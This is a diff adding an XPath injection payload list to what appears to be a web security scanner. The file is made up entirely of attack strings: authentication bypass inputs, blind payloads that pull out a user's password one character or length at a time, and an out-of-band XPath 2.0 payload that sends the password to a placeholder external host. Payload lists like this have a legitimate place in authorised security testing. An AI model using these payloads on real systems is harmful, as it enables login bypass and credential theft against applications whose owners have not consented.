@@ -1,0 +1,17 @@
+# XPath Injection Payloads — cyberm4fia-scanner
+# Categories: Auth Bypass, Blind
+
+# ─── Auth Bypass ───
+' or '1'='1
+' or 1=1 or ''='
+admin' or '1'='1
+' or name()='username' or 'a'='a
+x'] | //* | a['
+x' or true() or 'x'='y
+
+# ─── Blind XPath ───
+' and substring(//user[1]/password,1,1)='a' and ''='
+' and string-length(//user[1]/password)=8 and ''='
+
+# ─── XPath 2.0 OOB ───
+' and doc(concat('http://OAST/',//user[1]/password))=0 and ''='
